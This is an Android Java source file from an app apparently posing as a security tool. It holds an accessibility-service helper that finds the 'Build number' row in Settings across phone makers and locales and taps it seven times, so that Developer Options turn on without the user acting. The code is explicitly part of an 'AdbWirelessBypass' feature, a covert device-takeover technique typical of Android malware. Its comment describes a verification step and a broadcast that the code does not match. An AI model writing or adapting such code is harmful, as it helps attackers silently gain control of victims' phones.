package com.seguranca.protecao.features.bypass;

import android.accessibilityservice.AccessibilityService;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;

import java.util.Arrays;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * AutoTapBuildNumber
 *
 * When the AdbWirelessBypass can't write developer settings directly
 * (no root, no WRITE_SETTINGS), it opens Settings > About Phone and
 * this helper auto-taps the "Build Number" row 7 times to enable
 * Developer Options the same way a user would.
 *
 * Flow:
 *   1. AdbWirelessBypass sends broadcast com.seguranca.protecao.AUTO_TAP_BUILD_NUMBER
 *   2. UiAssistBridge receives it (via BroadcastReceiver registered in onServiceConnected)
 *   3. Calls AutoTapBuildNumber.arm()
 *   4. On next TYPE_WINDOW_STATE_CHANGED, onWindow() checks if it's About Phone
 *   5. Finds and clicks "Build number" node 7 times with 200ms delay between each
 *   6. After 7 taps, verifies Developer Options enabled and sends BYPASS_CONFIRM_DEV
 *
 * Integrate into UiAssistBridge:
 *
 *   // in onServiceConnected():
 *   IntentFilter f = new IntentFilter("com.seguranca.protecao.AUTO_TAP_BUILD_NUMBER");
 *   registerReceiver(AutoTapBuildNumber.makeReceiver(this), f);
 *
 *   // in onAccessibilityEvent():
 *   AutoTapBuildNumber.onWindow(this, event);
 */
public final class AutoTapBuildNumber {

    private static final String TAG = "AutoTap";

    // Package names of Android Settings across OEMs
    private static final List<String> SETTINGS_PKGS = Arrays.asList(
        "com.android.settings",
        "com.samsung.android.settings",
        "com.miui.settings",           // Xiaomi / MIUI
        "com.huawei.systemmanager",    // Huawei EMUI
        "com.oppo.settings",           // OPPO
        "com.vivo.settings",           // Vivo
        "com.oneplus.settings"         // OnePlus OxygenOS
    );

    // Possible text labels for the Build Number row (multi-locale)
    private static final List<String> BUILD_NUMBER_LABELS = Arrays.asList(
        "build number", "número de compilação", "numero de compilacion",
        "numero build", "build-nummer", "numéro de build",
        "빌드 번호",    "ビルド番号",  "内部版本号",  "版本号",
        "miui version", "emui version", "couleur ui",
        "kernel version"  // fallback on some firmwares
    );

    private static final int    TAPS_REQUIRED  = 7;
    private static final long   TAP_INTERVAL   = 200L;  // ms between taps
    private static final long   ARM_TIMEOUT    = 30_000L; // disarm after 30s

    private static final AtomicBoolean  armed    = new AtomicBoolean(false);
    private static final AtomicInteger  tapsDone = new AtomicInteger(0);
    private static final Handler        handler  = new Handler(Looper.getMainLooper());
    private static volatile long        armedAt  = 0L;

    private AutoTapBuildNumber() {}

    public static void arm() {
        armed.set(true);
        tapsDone.set(0);
        armedAt = System.currentTimeMillis();
        Log.d(TAG, "Armed — waiting for About Phone screen");
        // Auto-disarm after timeout
        handler.postDelayed(() -> {
            if (armed.get() && System.currentTimeMillis() - armedAt > ARM_TIMEOUT) {
                armed.set(false);
                Log.d(TAG, "Auto-disarmed (timeout)");
            }
        }, ARM_TIMEOUT);
    }

    /**
     * Call from UiAssistBridge.onAccessibilityEvent() for
     * TYPE_WINDOW_STATE_CHANGED events.
     */
    public static void onWindow(AccessibilityService svc, AccessibilityEvent event) {
        if (!armed.get()) return;
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return;

        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
        if (!SETTINGS_PKGS.contains(pkg)) return;

        handler.postDelayed(() -> findAndTapBuildNumber(svc), 600);
    }

    private static void findAndTapBuildNumber(AccessibilityService svc) {
        if (!armed.get()) return;
        try {
            AccessibilityNodeInfo root = svc.getRootInActiveWindow();
            if (root == null) return;

            AccessibilityNodeInfo buildNode = findBuildNumberNode(root);
            root.recycle();

            if (buildNode == null) {
                Log.d(TAG, "Build number node not found in current window");
                return;
            }

            doTapSequence(svc, buildNode);

        } catch (Exception e) {
            Log.e(TAG, "findAndTap: " + e.getMessage());
        }
    }

    private static void doTapSequence(AccessibilityService svc, AccessibilityNodeInfo node) {
        int remaining = TAPS_REQUIRED - tapsDone.get();
        if (remaining <= 0) return;

        for (int i = 0; i < remaining; i++) {
            final int tapIndex = i;
            handler.postDelayed(() -> {
                try {
                    // Re-find the node before each tap (tree may have changed)
                    AccessibilityNodeInfo root = svc.getRootInActiveWindow();
                    if (root == null) return;
                    AccessibilityNodeInfo fresh = findBuildNumberNode(root);
                    root.recycle();

                    if (fresh != null) {
                        // Scroll to it if needed
                        AccessibilityNodeInfo parent = fresh.getParent();
                        if (parent != null) {
                            parent.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
                            parent.recycle();
                        }
                        fresh.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        int done = tapsDone.incrementAndGet();
                        Log.d(TAG, "Tap " + done + "/" + TAPS_REQUIRED);
                        fresh.recycle();

                        if (done >= TAPS_REQUIRED) {
                            armed.set(false);
                            Log.i(TAG, "7 taps done — Developer Options should be enabled");
                            // Broadcast success back so AdbWirelessBypass can continue
                            Context appCtx = null;
                            try {
                                appCtx = (Context) Class.forName("android.app.ActivityThread")
                                    .getMethod("currentApplication")
                                    .invoke(null);
                            } catch (Exception ignored) {}
                            if (appCtx != null) {
                                appCtx.sendBroadcast(
                                    new Intent("com.seguranca.protecao.DEV_OPTIONS_ENABLED")
                                        .setPackage("com.seguranca.protecao")
                                );
                            }
                        }
                    }
                } catch (Exception e) {
                    Log.w(TAG, "tap " + tapIndex + " error: " + e.getMessage());
                }
            }, TAP_INTERVAL * i);
        }
    }

    private static AccessibilityNodeInfo findBuildNumberNode(AccessibilityNodeInfo root) {
        if (root == null) return null;
        try {
            // Direct text search first (fastest)
            for (String label : BUILD_NUMBER_LABELS) {
                List<AccessibilityNodeInfo> nodes =
                    root.findAccessibilityNodeInfosByText(label);
                for (AccessibilityNodeInfo n : nodes) {
                    if (n.isClickable()) return n;
                    // Walk up to nearest clickable parent
                    AccessibilityNodeInfo p = n.getParent();
                    int depth = 0;
                    while (p != null && depth++ < 4) {
                        if (p.isClickable()) { n.recycle(); return p; }
                        AccessibilityNodeInfo gp = p.getParent();
                        p.recycle();
                        p = gp;
                    }
                    if (p != null) p.recycle();
                    n.recycle();
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "findNode: " + e.getMessage());
        }
        return null;
    }

    /** Create the BroadcastReceiver to register in UiAssistBridge. */
    public static BroadcastReceiver makeReceiver(AccessibilityService svc) {
        return new BroadcastReceiver() {
            @Override public void onReceive(Context ctx, Intent intent) {
                if ("com.seguranca.protecao.AUTO_TAP_BUILD_NUMBER".equals(intent.getAction())) {
                    AutoTapBuildNumber.arm();
                }
            }
        };
    }
}
